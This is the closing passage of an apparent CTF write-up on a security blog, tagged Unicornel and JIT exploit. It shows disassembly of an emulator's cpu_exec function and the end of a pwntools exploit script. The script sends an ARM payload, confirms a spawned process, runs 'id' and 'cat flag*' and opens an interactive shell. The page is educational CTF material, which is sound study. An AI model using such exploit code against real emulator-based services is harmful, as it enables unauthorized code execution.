</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        0x559c69a119b8 4989c4              &lt;cpu_exec_x86_64+0x298&gt;   mov    r12, rax 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        0x559c69a119bb 488b83a8810000      &lt;cpu_exec_x86_64+0x29b&gt;   mov    rax, QWORD PTR [rbx + 0x81a8] 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        0x559c69a119c2 4d89e7              &lt;cpu_exec_x86_64+0x2a2&gt;   mov    r15, r12 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> asm_arm(code)
</span></span><span style="display:flex;"><span>    SEND_ELF(UC_ARCH_ARM, UC_MODE_ARM, len(payload))
</span></span><span style="display:flex;"><span>    pause()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;with pid &#39;</span>)
</span></span><span style="display:flex;"><span>        pid <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>        log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;created process - </span><span style="color:#e6db74">{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>        sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;id&#39;</span>)
</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;id&#39;</span>)
</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cat flag*&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;uid&#39;</span> <span style="color:#f92672">in</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;uid&#39;</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>):
</span></span><span style="display:flex;"><span>            p<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        print(e)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>    it <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>close()
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://msh1307.kr/tags/unicornel/">Unicornel</a></li>
      <li><a href="https://msh1307.kr/tags/jit-exploit/">JIT Exploit</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://msh1307.kr">msh1307</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
